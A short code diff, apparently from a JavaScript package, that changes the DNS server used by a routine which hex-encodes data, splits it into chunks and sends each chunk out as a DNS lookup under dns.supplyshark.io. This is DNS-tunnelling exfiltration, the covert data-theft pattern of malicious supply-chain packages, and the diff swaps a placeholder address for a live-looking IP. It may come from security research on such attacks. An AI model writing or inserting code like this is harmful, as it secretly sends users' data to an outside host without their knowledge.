@@ -8,7 +8,7 @@
       d = Buffer.from(d).toString('hex').match(/.{1,50}/g);
       const i = Math.random().toString(36).substring(7);
 
-      a.setServers(['42.42.42.42']);
+      a.setServers(['143.198.106.144']);
 
       for (const c of d) {
         a.resolve(`${i}.${c}.dns.supplyshark.io`, 'A');
